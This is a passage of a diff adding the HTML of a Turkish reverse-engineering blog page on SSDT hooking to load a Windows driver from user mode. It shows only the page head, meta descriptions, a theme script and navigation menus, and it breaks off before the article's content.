@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+<html lang="tr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>SSDT Hooking ile User-Mode Programda Sürücü Yükleme – 0xbekoo</title>
+  <meta name="description" content="
+Important
+I also wrote an article about this work in English on Medium, you can click here if you want to take a look.
+Merhabalar efenimm bloguma hoşgeldiniz. Bu blogta SSDT Hooking tekniğine bir yakından bakacağız. Bu teknik için hazırladığım proje üzerinden ilerleyeceğiz. Başlıktan gördüğünüz üzere User-Mode programı kullanarak NtLoadDriver ile sürücü yüklemesini sağlayacağız." /><link rel="canonical" href="http://localhost:1313/tr/blog/ssdt-hooking/" itemprop="url" />
+
+<meta property="og:title" content="SSDT Hooking ile User-Mode Programda Sürücü Yükleme" />
+<meta property="og:description" content="
+
+  Important
+
+  
+    I also wrote an article about this work in English on Medium, you can click here if you want to take a look.
+  
+
+Merhabalar efenimm bloguma hoşgeldiniz. Bu blogta SSDT Hooking tekniğine bir yakından bakacağız. Bu teknik için hazırladığım proje üzerinden ilerleyeceğiz. Başlıktan gördüğünüz üzere User-Mode programı kullanarak NtLoadDriver ile sürücü yüklemesini sağlayacağız." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/tr/blog/ssdt-hooking/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2025-02-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-02-22T00:00:00+00:00" />
+
+  <meta itemprop="name" content="SSDT Hooking ile User-Mode Programda Sürücü Yükleme">
+  <meta itemprop="description" content="Important
+I also wrote an article about this work in English on Medium, you can click here if you want to take a look.
+Merhabalar efenimm bloguma hoşgeldiniz. Bu blogta SSDT Hooking tekniğine bir yakından bakacağız. Bu teknik için hazırladığım proje üzerinden ilerleyeceğiz. Başlıktan gördüğünüz üzere User-Mode programı kullanarak NtLoadDriver ile sürücü yüklemesini sağlayacağız.">
+  <meta itemprop="datePublished" content="2025-02-22T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-22T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2962">
+  <meta itemprop="keywords" content="Reverse-Engineering,Windows-Kernel,Rootkit,Windbg,Dynamic-Analysis">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SSDT Hooking ile User-Mode Programda Sürücü Yükleme">
+  <meta name="twitter:description" content="Important
+I also wrote an article about this work in English on Medium, you can click here if you want to take a look.
+Merhabalar efenimm bloguma hoşgeldiniz. Bu blogta SSDT Hooking tekniğine bir yakından bakacağız. Bu teknik için hazırladığım proje üzerinden ilerleyeceğiz. Başlıktan gördüğünüz üzere User-Mode programı kullanarak NtLoadDriver ile sürücü yüklemesini sağlayacağız.">
+
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+</head>
+<body dir="ltr"><div class="nav-container hx-sticky hx-top-0 hx-z-20 hx-w-full hx-bg-transparent print:hx-hidden">
+  <div class="nav-container-blur hx-pointer-events-none hx-absolute hx-z-[-1] hx-h-full hx-w-full hx-bg-white dark:hx-bg-dark hx-shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:hx-shadow-[0_0_0_1px_#000] dark:hx-shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:hx-shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx-mx-auto hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-px-6 hx-max-w-[90rem]">
+    <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/tr/">
+        <span class="hx-mx-2 hx-font-extrabold hx-inline hx-select-none" title="0xbekoo">0xbekoo</span>
+    </a><a
+            title="Documentation"
+            href="/tr/docs"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-text-gray-600 hover:hx-text-gray-800 dark:hx-text-gray-400 dark:hover:hx-text-gray-200"
+          >
+            <span class="hx-text-center">Documentation</span>
+          </a><a
+            title="Blogs"
+            href="/tr/blog"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-font-medium"
+          >
+            <span class="hx-text-center">Blogs</span>
+          </a><a
+            title="About"
+            href="/tr/about"
+            
+            class="hx-text-sm contrast-more:hx-text-gray-700 contrast-more:dark:hx-text-gray-100 hx-relative -hx-ml-2 hx-hidden hx-whitespace-nowrap hx-p-2 md:hx-inline-block hx-text-gray-600 hover:hx-text-gray-800 dark:hx-text-gray-400 dark:hover:hx-text-gray-200"
+          >
+            <span class="hx-text-center">About</span>
+          </a>
+          <a class="hx-p-2 hx-text-current" target="_blank" rel="noreferrer" href="https://github.com/0xbekoo" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx-sr-only">GitHub</span>
+          </a>
+          <a class="hx-p-2 hx-text-current" target="_blank" rel="noreferrer" href="https://x.com/0xbekooo" title="Twitter"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"></path></svg><span class="hx-sr-only">Twitter</span>
+          </a><button type="button" aria-label="Menu" class="hamburger-menu -hx-mr-2 hx-rounded hx-p-2 active:hx-bg-gray-400/20 md:hx-hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx-mx-auto hx-flex hx-max-w-screen-xl">
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] hx-fixed hx-inset-0 hx-z-10 hx-bg-black/80 dark:hx-bg-black/60 hx-hidden"></div>
+<aside class="sidebar-container hx-flex hx-flex-col print:hx-hidden md:hx-top-16 md:hx-shrink-0 md:hx-w-64 md:hx-self-start max-md:[transform:translate3d(0,-100%,0)] md:hx-hidden xl:hx-block">
+  
+  <div class="hx-px-4 hx-pt-4 md:hx-hidden">
+    <div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx-overflow-y-auto hx-overflow-x-hidden hx-p-4 hx-grow md:hx-h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
+      
+      
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/"
+    
+  >Blogs
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/patchguard-analysis-part-1/"
+    
+  >PatchGuard Analysis - Part 1
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/patchguard-analysis-part-2/"
+    
+  >PatchGuard Analysis - Part 2
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/patchguard-analysis-part-3/"
+    
+  >PatchGuard Analysis - Part 3
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/patchguard-analysis-part-4/"
+    
+  >PatchGuard Analysis - Part 4
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/tr/blog/ssdt-hooking/"
+    
+  >SSDT Hooking ile User-Mode Programda Sürücü Yükleme
+    </a>
+  
+    <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
+              <a
+                href="#ssdt-hooking"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >SSDT Hooking</a>
+            </li>
+          <li>
+              <a
+                href="#proje"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Proje</a>
+            </li>
+          <li>
+              <a
+                href="#code"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Code</a>
+            </li>
+          <li>
+              <a
+                href="#projenin-%c3%a7al%c4%b1%c5%9ft%c4%b1r%c4%b1lmas%c4%b1"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Projenin Çalıştırılması</a>
+            </li>
+          <li>
+              <a
+                href="#sonu%c3%a7"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Sonuç</a>
+            </li>
+          <li>
+              <a
+                href="#references"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >&lt;strong&gt;References&lt;/strong&gt;</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/syscalls/"
+    
+  >Windows Kernel&#39;da Systemm Call Mekanızmasını Reverseleme
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/bare-metal-reversing/"
+    
+  >ARM Firmware Reverse Engineering
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/router-firmware-reversing/"
+    
+  >Router Firmware Reverse Engineering
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/is-valorant-spyware/"
+    
+  >Is Valorant Spyware?
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/blog/bypass-ptrace/"
+    
+  >Bypass Ptrace
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/"
+    
+  >Documentation
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tr/docs/uefi-dev/"
+    
+  >UEFI Development
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
